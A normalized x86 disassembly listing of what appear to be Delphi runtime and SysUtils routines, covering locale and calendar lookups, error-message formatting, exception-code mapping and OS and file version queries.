lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a1e8
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40a9bc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a7c8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404250
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40a9f0
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a484
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40a9bc
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404250
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40a7c8
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40aa7c
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404080
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40aac8
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403fe4
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404080
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40ab14
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40ab3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40aac8
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405a90
sub_40ab78
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40ac8b
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40ab3c
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fe4
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40ab3c
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403fe4
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40ab3c
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403fe4
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40ab3c
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403fe4
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ac92
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403fb4
retn
sub_40ac9c
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404188
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40acd8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40ad3d
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404188
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_407ecc
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ad44
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
inc ebx
sub_40ad50
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40ade7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40aac8
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_407ecc
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40adee
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40ac9c
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40acd8
call EnumCalendarInfoA
sub_40ae00
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40afca
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403f90
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40aac8
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_407ecc
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404250
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40afd1
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403fb4
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40847c
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40be70
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4044b0
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404258
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403fe4
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_40847c
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404258
inc ebx
jmp r-xdata
mov eax esi
call sub_404250
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40847c
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404258
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404258
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404258
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404178
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404258
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404178
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404258
sub_40b034
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b028
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40bfc0
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_4083a0
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404ffc
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4031a8
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4089c4
mov eax [ ebp - 0x4 ]
call sub_40833c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404450
mov ebx eax
mov eax ebx
call sub_40833c
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b1bc
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b034
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404ffc
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402af0
call sub_402824
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_40833c
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b284
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403fe4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_40b2c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b31a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408a04
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fe4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b321
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
add esp 0xfffffff0
call sub_403564
sub_40b321
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_40b340
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405a90
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_40b37c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b3e8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405a90
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408a04
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fe4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3ef
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
add esp 0xfffffff0
call sub_403564
sub_40b3ef
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_40b43c
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402898
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b49c
mov al [ 0xe0040b4 ]
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_4039cc
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b284
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b43c
mov edx eax
sub_40b510
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b5ac
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404028
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b5b3
lea eax [ ebp - 0x20 ]
call sub_403f90
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40b600
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40b698
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40b853
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404200
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408254
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b85a
lea eax [ ebp - 0x170 ]
call sub_403f90
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403fb4
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40b864
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40b91f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b600
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b284
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
push ebp
call sub_40b698
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b926
lea eax [ ebp - 0x10 ]
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
mov ebx eax
sub_40b940
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40b930
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40b680
mov eax [ rw-data ]
mov [ eax ] sub_40b864
mov eax sub_40b5cc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b5e8
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40b9c4
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403258
xor eax eax
mov [ rw-data ] eax
sub_40ba44
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404200
sub_40bad4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bbaa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404028
lea eax [ ebp - 0x8 ]
call j_sub_40445c#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404450
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bbb1
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov eax ebx
call sub_4026bc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bb8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404450
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bbc0
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40bc38
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404450
mov edx esi
dec edx
call sub_40bbc0
sub_40bc74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404250
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40bc9c
pop esi
pop ebx
retn
mov eax ebx
call sub_404250
mov esi eax
sub_40bc9c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404250
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40beac
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40bcf4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404250
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
